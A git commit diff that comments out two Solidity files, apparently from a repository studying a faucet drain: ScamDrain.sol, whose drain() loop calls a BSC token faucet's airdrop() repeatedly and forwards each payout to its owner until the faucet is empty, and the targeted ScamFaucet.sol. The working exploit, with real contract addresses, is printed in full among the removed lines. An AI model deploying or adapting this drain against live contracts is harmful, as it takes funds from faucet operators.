a311cea0665212289e0538d7f384b9682ed405ec
steadylearner <32325099+steadylearner@users.noreply.github.com>
2021-06-22 12:51:47 -0300

    Include test to share

--- real/faucet-drain/contracts/ScamDrain.sol
+++ real/faucet-drain/contracts/ScamDrain.sol
@@ -1,53 +1,53 @@
-/**
- *Submitted for verification at BscScan.com on 2021-06-21
-*/
+// /**
+//  *Submitted for verification at BscScan.com on 2021-06-21
+// */
 
-pragma solidity =0.7.6;
+// pragma solidity =0.7.6;
 
-contract ScamDrain {
+// contract ScamDrain {
 
-    address public constant FAUCET_ADDRESS = 0xFcF2774cD61743fF7C34607Fadf3C84FC4762029;
-    address public constant SCAM_ADDRESS = 0xdb78FcBb4f1693FDBf7a85E970946E4cE466E2A9;
+//     address public constant FAUCET_ADDRESS = 0xFcF2774cD61743fF7C34607Fadf3C84FC4762029;
+//     address public constant SCAM_ADDRESS = 0xdb78FcBb4f1693FDBf7a85E970946E4cE466E2A9;
     
-	address owner_;
+// 	address owner_;
 	
-    constructor() {
-        owner_ = msg.sender;
-    } 
+//     constructor() {
+//         owner_ = msg.sender;
+//     } 
     
-    function drain() public {
-        ScamFaucet faucet = ScamFaucet(FAUCET_ADDRESS);
+//     function drain() public {
+//         ScamFaucet faucet = ScamFaucet(FAUCET_ADDRESS);
         
-        BEP20 scamtoken = BEP20(SCAM_ADDRESS);
+//         BEP20 scamtoken = BEP20(SCAM_ADDRESS);
 		
-		uint256 airdropsize = faucet.airdropSize();
-		uint256 balance = scamtoken.balanceOf(FAUCET_ADDRESS);
-		require(balance >= airdropsize, "NOT FUNDED");
+// 		uint256 airdropsize = faucet.airdropSize();
+// 		uint256 balance = scamtoken.balanceOf(FAUCET_ADDRESS);
+// 		require(balance >= airdropsize, "NOT FUNDED");
 		
-        do {
-            //airdrop to this contract
-            faucet.airdrop();
-            //send from this contract to the caller
-            scamtoken.transfer(owner_, airdropsize);
+//         do {
+//             //airdrop to this contract
+//             faucet.airdrop();
+//             //send from this contract to the caller
+//             scamtoken.transfer(owner_, airdropsize);
             
-            //repeat until faucet is no longer funded
-            balance = balance - airdropsize;
-        } while (balance >= airdropsize);
-    }
-}
+//             //repeat until faucet is no longer funded
+//             balance = balance - airdropsize;
+//         } while (balance >= airdropsize);
+//     }
+// }
 
-abstract contract ScamFaucet {
-    uint256 public airdropSize;
+// abstract contract ScamFaucet {
+//     uint256 public airdropSize;
     
-    function isFaucetFunded() virtual external view returns(bool);
-    function canAddressReceive(address adr) virtual public view returns(bool);
-    function airdrop() virtual public ;
-}
+//     function isFaucetFunded() virtual external view returns(bool);
+//     function canAddressReceive(address adr) virtual public view returns(bool);
+//     function airdrop() virtual public ;
+// }
 
-abstract contract BEP20 {
+// abstract contract BEP20 {
     
     
-    function balanceOf(address tokenOwner) virtual external view returns (uint256);
-    function transfer(address receiver, uint256 numTokens) virtual public returns (bool);
-    function totalSupply() virtual external view returns (uint256);
-}
+//     function balanceOf(address tokenOwner) virtual external view returns (uint256);
+//     function transfer(address receiver, uint256 numTokens) virtual public returns (bool);
+//     function totalSupply() virtual external view returns (uint256);
+// }
--- real/faucet-drain/contracts/ScamFaucet.sol
+++ real/faucet-drain/contracts/ScamFaucet.sol
@@ -1,183 +1,183 @@
-/**
- *Submitted for verification at BscScan.com on 2021-06-16
-*/
+// /**
+//  *Submitted for verification at BscScan.com on 2021-06-16
+// */
 
-// Faucet Contract that gives out up to 200 $SCAM to any caller that doesn't hold $SCAM yet.
+// // Faucet Contract that gives out up to 200 $SCAM to any caller that doesn't hold $SCAM yet.
 
-// "SPDX-License-Identifier: UNLICENSED"
-pragma solidity =0.7.6;
+// // "SPDX-License-Identifier: UNLICENSED"
+// pragma solidity =0.7.6;
 
-contract ScamFaucet {
-	using SafeMath for uint256;
+// contract ScamFaucet {
+// 	using SafeMath for uint256;
 
-    address public Owner;
-    address public constant ScamToken = 0xdb78FcBb4f1693FDBf7a85E970946E4cE466E2A9;
+//     address public Owner;
+//     address public constant ScamToken = 0xdb78FcBb4f1693FDBf7a85E970946E4cE466E2A9;
     
-	uint256 constant decimals = 18;
-	uint256 public constant maxAirdropSize = 200 * 10 ** decimals;
-	uint256 public airdropSize = 100 * 10 ** decimals;
+// 	uint256 constant decimals = 18;
+// 	uint256 public constant maxAirdropSize = 200 * 10 ** decimals;
+// 	uint256 public airdropSize = 100 * 10 ** decimals;
 	
-	uint256 public totalBenefitorWallets;
-	mapping (address => bool) public benefitorWallets;
+// 	uint256 public totalBenefitorWallets;
+// 	mapping (address => bool) public benefitorWallets;
 
-	event NewOwner(address indexed oldOwner, address indexed newOwner);
-	event Airdrop(address indexed receiver, uint256 amount);
+// 	event NewOwner(address indexed oldOwner, address indexed newOwner);
+// 	event Airdrop(address indexed receiver, uint256 amount);
 
-	// https://ethereum.stackexchange.com/questions/15641/how-does-a-contract-find-out-if-another-address-is-a-contract/15642#15642
-	function isContract(address _addr) public view returns (bool result){
-		uint32 size;
-		assembly {
-			size := extcodesize(_addr)
-		}
-		return (size > 0);
-	}
+// 	// https://ethereum.stackexchange.com/questions/15641/how-does-a-contract-find-out-if-another-address-is-a-contract/15642#15642
+// 	function isContract(address _addr) public view returns (bool result){
+// 		uint32 size;
+// 		assembly {
+// 			size := extcodesize(_addr)
+// 		}
+// 		return (size > 0);
+// 	}
 
-	// Should be modifier?
+// 	// Should be modifier?
 	
-	// _wallet shouldn't be a contract and filtered with alreadyReceivedScam
-    function saveBenefitorWallet(address _wallet) private {
-        benefitorWallets[_wallet]=true;
-    }
+// 	// _wallet shouldn't be a contract and filtered with alreadyReceivedScam
+//     function saveBenefitorWallet(address _wallet) private {
+//         benefitorWallets[_wallet]=true;
+//     }
 
-    function alreadyReceivedScam(address _wallet) public view returns (bool){
-        return benefitorWallets[_wallet];
-    }
+//     function alreadyReceivedScam(address _wallet) public view returns (bool){
+//         return benefitorWallets[_wallet];
+//     }
 
-	// Modifiers
-    modifier onlyOwner 
-	{
-		require(msg.sender == Owner, "Admin Function!");
-        _;
-    }
+// 	// Modifiers
+//     modifier onlyOwner 
+// 	{
+// 		require(msg.sender == Owner, "Admin Function!");
+//         _;
+//     }
     
-    // Constructor. 
-    constructor() 
-    {
- 		Owner = msg.sender;
-    }  
+//     // Constructor. 
+//     constructor() 
+//     {
+//  		Owner = msg.sender;
+//     }  
     
-    // Change Owner
-	function changeOwner(address newOwner) external onlyOwner 
-	{    
-		address oldOwner = Owner;
-	    Owner = newOwner;
-	    emit NewOwner(oldOwner, Owner);
-	}
+//     // Change Owner
+// 	function changeOwner(address newOwner) external onlyOwner 
+// 	{    
+// 		address oldOwner = Owner;
+// 	    Owner = newOwner;
+// 	    emit NewOwner(oldOwner, Owner);
+// 	}
 	
-	// Adapt airdrop size.
-	// Can only be called by owner, airdrop size can't exceed max amount
-	// amount should be passed without decimals. Gets adapted in function call
-	function changeAirdropSize(uint256 size) external onlyOwner
-	{
-	    uint256 sizeWithDec = size * 10 ** decimals;
-	    require(sizeWithDec <= maxAirdropSize, "Exceeds maximum airdrop size!");
+// 	// Adapt airdrop size.
+// 	// Can only be called by owner, airdrop size can't exceed max amount
+// 	// amount should be passed without decimals. Gets adapted in function call
+// 	function changeAirdropSize(uint256 size) external onlyOwner
+// 	{
+// 	    uint256 sizeWithDec = size * 10 ** decimals;
+// 	    require(sizeWithDec <= maxAirdropSize, "Exceeds maximum airdrop size!");
 	    
-	    airdropSize = sizeWithDec;
-	}
+// 	    airdropSize = sizeWithDec;
+// 	}
 	
-	// Returns true if faucet is funded with enough $SCAM to perform airdrop
-	function isFaucetFunded() external view returns(bool)
-	{
-	    if (BEP20(ScamToken).balanceOf(address(this)) >= airdropSize)
-	    {
-	        return true;
-	    }
-	    else
-	    {
-	        return false;
-	    }
-	}
+// 	// Returns true if faucet is funded with enough $SCAM to perform airdrop
+// 	function isFaucetFunded() external view returns(bool)
+// 	{
+// 	    if (BEP20(ScamToken).balanceOf(address(this)) >= airdropSize)
+// 	    {
+// 	        return true;
+// 	    }
+// 	    else
+// 	    {
+// 	        return false;
+// 	    }
+// 	}
 	
-	// Returns true if address has a $SCAM balance of 0
-	function canAddressReceive(address adr) public view returns(bool)
-	{
-		// Use modifier instead?
-		require(!isContract(adr), "disallow a contract to earn SCAM from the faucet");
-		require(!alreadyReceivedScam(adr), "allow an address to receive SCAM only once");
+// 	// Returns true if address has a $SCAM balance of 0
+// 	function canAddressReceive(address adr) public view returns(bool)
+// 	{
+// 		// Use modifier instead?
+// 		require(!isContract(adr), "disallow a contract to earn SCAM from the faucet");
+// 		require(!alreadyReceivedScam(adr), "allow an address to receive SCAM only once");
 
-	    if (BEP20(ScamToken).balanceOf(adr) == 0)
-	    {
-	        return true;
-	    }
-	    else
-	    {
-	        return false;
-	    }
-	}
+// 	    if (BEP20(ScamToken).balanceOf(adr) == 0)
+// 	    {
+// 	        return true;
+// 	    }
+// 	    else
+// 	    {
+// 	        return false;
+// 	    }
+// 	}
 	
-	// Perform airdrop to calling function
-	function airdrop() public 
-    {
-        require(canAddressReceive(msg.sender), "Fail to meet requirements to receive SCAM Free");
+// 	// Perform airdrop to calling function
+// 	function airdrop() public 
+//     {
+//         require(canAddressReceive(msg.sender), "Fail to meet requirements to receive SCAM Free");
         
-        BEP20(ScamToken).transfer(msg.sender, airdropSize);
+//         BEP20(ScamToken).transfer(msg.sender, airdropSize);
 		
-		saveBenefitorWallet(msg.sender);
-		totalBenefitorWallets = totalBenefitorWallets.add(1);
+// 		saveBenefitorWallet(msg.sender);
+// 		totalBenefitorWallets = totalBenefitorWallets.add(1);
 
-        emit Airdrop(msg.sender, airdropSize);
-    }	
+//         emit Airdrop(msg.sender, airdropSize);
+//     }	
 	
-	// Fallback function. Gets called if no method is called in transaction
-	// Calls airdrop() inherently.
-	fallback() external
-	{
-		airdrop();
-	}
-}
+// 	// Fallback function. Gets called if no method is called in transaction
+// 	// Calls airdrop() inherently.
+// 	fallback() external
+// 	{
+// 		airdrop();
+// 	}
+// }
 
-// Interface for BEP20
-abstract contract BEP20 {
+// // Interface for BEP20
+// abstract contract BEP20 {
     
-    function balanceOf(address tokenOwner) virtual external view returns (uint256);
-    function transfer(address receiver, uint256 numTokens) virtual public returns (bool);
-    function totalSupply() virtual external view returns (uint256);
-}
+//     function balanceOf(address tokenOwner) virtual external view returns (uint256);
+//     function transfer(address receiver, uint256 numTokens) virtual public returns (bool);
+//     function totalSupply() virtual external view returns (uint256);
+// }
 
-/**
- * @title SafeMath
- * @dev Math operations with safety checks that throw on error
- */
-library SafeMath {
+// /**
+//  * @title SafeMath
+//  * @dev Math operations with safety checks that throw on error
+//  */
+// library SafeMath {
 
-  /**
-  * @dev Multiplies two numbers, throws on overflow.
-  */
-  function mul(uint256 a, uint256 b) internal pure returns (uint256 c) {
-    if (a == 0) {
-      return 0;
-    }
-    c = a * b;
-    assert(c / a == b);
-    return c;
-  }
+//   /**
+//   * @dev Multiplies two numbers, throws on overflow.
+//   */
+//   function mul(uint256 a, uint256 b) internal pure returns (uint256 c) {
+//     if (a == 0) {
+//       return 0;
+//     }
+//     c = a * b;
+//     assert(c / a == b);
+//     return c;
+//   }
 
-  /**
-  * @dev Integer division of two numbers, truncating the quotient.
-  */
-  function div(uint256 a, uint256 b) internal pure returns (uint256) {
-    // assert(b > 0); // Solidity automatically throws when dividing by 0
-    // uint256 c = a / b;
-    // assert(a == b * c + a % b); // There is no case in which this doesn't hold
-    return a / b;
-  }
+//   /**
+//   * @dev Integer division of two numbers, truncating the quotient.
+//   */
+//   function div(uint256 a, uint256 b) internal pure returns (uint256) {
+//     // assert(b > 0); // Solidity automatically throws when dividing by 0
+//     // uint256 c = a / b;
+//     // assert(a == b * c + a % b); // There is no case in which this doesn't hold
+//     return a / b;
+//   }
 
-  /**
-  * @dev Subtracts two numbers, throws on overflow (i.e. if subtrahend is greater than minuend).
-  */
-  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
-    assert(b <= a);
-    return a - b;
-  }
+//   /**
+//   * @dev Subtracts two numbers, throws on overflow (i.e. if subtrahend is greater than minuend).
+//   */
+//   function sub(uint256 a, uint256 b) internal pure returns (uint256) {
+//     assert(b <= a);
+//     return a - b;
+//   }
 
-  /**
-  * @dev Adds two numbers, throws on overflow.
-  */
-  function add(uint256 a, uint256 b) internal pure returns (uint256 c) {
-    c = a + b;
-    assert(c >= a);
-    return c;
-  }
+//   /**
+//   * @dev Adds two numbers, throws on overflow.
+//   */
+//   function add(uint256 a, uint256 b) internal pure returns (uint256 c) {
+//     c = a + b;
+//     assert(c >= a);
+//     return c;
+//   }
   
   
-}
+// }
